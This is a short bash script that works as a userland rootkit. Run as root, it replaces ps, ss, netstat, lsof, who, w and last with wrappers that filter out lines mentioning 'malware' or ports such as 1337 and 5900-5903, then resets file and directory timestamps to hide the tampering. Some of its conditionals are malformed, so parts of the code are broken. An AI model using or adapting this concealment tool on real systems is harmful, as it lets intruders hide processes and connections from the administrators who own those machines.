#!/bin/bash

if [ $EUID -ne 0 ]; then
	echo "[!] Must run as root"
	exit 1
fi

get_timestamp () {
	stat -L $1 | grep Modify | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "
}

PROCESSES="ps ss netstat lsof who w last"
HIDDEN="malware|1337|1414|1415|1416|1417|5900|5901|5902|5903"

bin_timestamp=`get_timestamp /bin`
sbin_timestamp=`get_timestamp /sbin`

for process in $PROCESSES; do
	if `which $process`; then
		process_path=`which $process`

		if [ -f "/bin/bak${process}" ]; then
			echo "[-] Binary '$process' has already been hijacked, skipping"
		else
			process_timestamp=`get_timestamp "$process_path"`
			if [ ! cp "$process_path" "/bin/bak${process}" ]; then
				echo "[!] Could not copy '$process_path' to '/bin/bak${process}', aborting"
			else
				if [ ! echo "/bin/bak${process} \$@ | egrep -v \"$HIDDEN\"" > "$process_path" ]; then
					echo "[!] Could not write to '$process_path', restoring original binary..."
					mv "/bin/bak${process}" "$process_path"
					touch -t $process_timestamp "$process_path"
				else
					chmod 755 "$process_path"
					touch -t $process_timestamp "$process_path"
					echo "[*] Hijacked binary '$process_path'"
				fi
			fi
		fi
	else
		echo "[-] Binary '$process' doesn't exist, skipping"
	fi
done

touch -t $bin_timestamp "/bin"
touch -t $sbin_timestamp "/sbin"

echo
echo "[+] Restored '/bin' and '/sbin' timestamps"

echo
echo "[+] Done!"
